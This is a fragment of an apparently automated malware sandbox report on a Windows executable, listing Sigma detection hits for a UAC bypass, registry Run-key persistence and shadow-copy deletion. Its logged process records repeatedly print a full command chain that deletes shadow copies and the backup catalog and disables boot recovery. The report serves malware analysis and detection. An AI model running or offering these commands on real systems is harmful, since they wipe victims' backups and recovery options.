                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F788-643C-4F06-000000004700}",
                                "ProcessId": "13088",
                                "Product": "-",
                                "Description": "-",
                                "Company": "-",
                                "ParentProcessGuid": "{C784477D-F787-643C-4806-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=10B3FD3C861D5CF657934C89260590AB,SHA256=CE9261B9BCBF5BE7EC01B8224AC5179B76108FE5D37A6BDC62731392DF2B2C30,IMPHASH=E9F710B579880D1B6FF748176EB620F1",
                                "OriginalFileName": "-",
                                "ParentImage": "C:\\Windows\\SysWOW64\\dllhost.exe",
                                "FileVersion": "-",
                                "ParentProcessId": "12908",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\" ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}",
                                "UtcTime": "1681717128",
                                "RuleName": "-"
                            }
                        }
                    ],
                    "rule_level": "high",
                    "rule_description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "CMSTP UAC Bypass via COM Object Access",
                    "rule_id": "a30845acd045e920f165087e59ac6d9461f6c4bfadfa52e4c518e3bcb9d8cb0c",
                    "rule_author": "Nik Seetharaman, Christian Burkard (Nextron Systems)"
                },
                {
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F771-643C-0306-000000004700}",
                                "ProcessId": "8804",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F771-643C-0106-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "8100",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "vssadmin  delete shadows /all /quiet ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717105",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F772-643C-0606-000000004700}",
                                "ProcessId": "8920",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F771-643C-0106-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "8100",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717106",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F775-643C-0906-000000004700}",
                                "ProcessId": "9012",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F771-643C-0106-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "8100",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717109",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F782-643C-1806-000000004700}",
                                "ProcessId": "11500",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F781-643C-1606-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11444",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  delete shadows /all /quiet ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717122",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F783-643C-1D06-000000004700}",
                                "ProcessId": "11604",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F781-643C-1606-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11444",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717123",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F783-643C-1F06-000000004700}",
                                "ProcessId": "11672",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F782-643C-1A06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11572",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681717123",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F787-643C-4106-000000004700}",
                                "ProcessId": "12728",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F781-643C-1606-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11444",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717127",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F787-643C-4306-000000004700}",
                                "ProcessId": "12776",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F786-643C-3D06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "12624",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681717127",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78C-643C-5F06-000000004700}",
                                "ProcessId": "14272",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F78C-643C-5D06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14216",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  delete shadows /all /quiet ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717132",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78C-643C-6106-000000004700}",
                                "ProcessId": "12516",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F78C-643C-5D06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14216",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717132",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78C-643C-6406-000000004700}",
                                "ProcessId": "11908",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F78C-643C-5D06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14216",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681717132",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78D-643C-6806-000000004700}",
                                "ProcessId": "14228",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F78D-643C-6506-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14272",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681717133",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78F-643C-8306-000000004700}",
                                "ProcessId": "14248",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F78E-643C-7F06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "13204",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681717135",
                                "RuleName": "-"
                            }
                        }
                    ],
                    "rule_level": "high",
                    "rule_description": "Shadow Copies deletion using operating systems utilities",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Shadow Copies Deletion Using Operating Systems Utilities",
                    "rule_id": "ad5e4d4b939797a70a9aa742d979a4742c2cfedddd663fb1a43b2795c1e6054b",
                    "rule_author": "Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)"
                },
                {
                    "match_context": [
                        {
                            "values": {
                                "EventID": "13",
                                "ProcessId": "2120",
                                "EventType": "SetValue",
                                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                                "ProcessGuid": "{C784477D-F76F-643C-FF05-000000004700}",
                                "UtcTime": "1681717103",
                                "Details": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "RuleName": "T1060,RunKey",
                                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\XO1XADpO01"
                            }
                        }
                    ],
                    "rule_level": "medium",
                    "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "CurrentVersion Autorun Keys Modification",
                    "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                    "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                },
                {
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F771-643C-0106-000000004700}",
                                "ProcessId": "8100",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F76F-643C-FF05-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "2120",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1681717105",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F781-643C-1606-000000004700}",
                                "ProcessId": "11444",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F77F-643C-1406-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "10116",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\" ",
                                "UtcTime": "1681717121",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-F78C-643C-5D06-000000004700}",
                                "ProcessId": "14216",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-F788-643C-4F06-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "13088",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-38A4-6407-009E-030000000000",
                                "LogonId": "237056",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\" ",
                                "UtcTime": "1681717132",
                                "RuleName": "-"
                            }
                        }
                    ],
                    "rule_level": "medium",
                    "rule_description": "Detects suspicious process starts on Windows systems based on keywords",
                    "rule_source": "SOC Prime Threat Detection Marketplace",
                    "rule_title": "Suspicious Process Creation",
                    "rule_id": "f09d5248ed8fc1a93251158bfda71f8144ccaf37fa922416ccd897498bff7c55",
                    "rule_author": "Florian Roth"
                }
            ],
            "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
            "type_tag": "peexe",
            "type_description": "Win32 EXE",
            "md5": "10b3fd3c861d5cf657934c89260590ab",
            "names": [
                "ce9261b9bcbf5be7ec01b8224ac5179b76108fe5d37a6bdc62731392df2b2c30",
                "executable.4024.exe"
            ]
        }
    }
}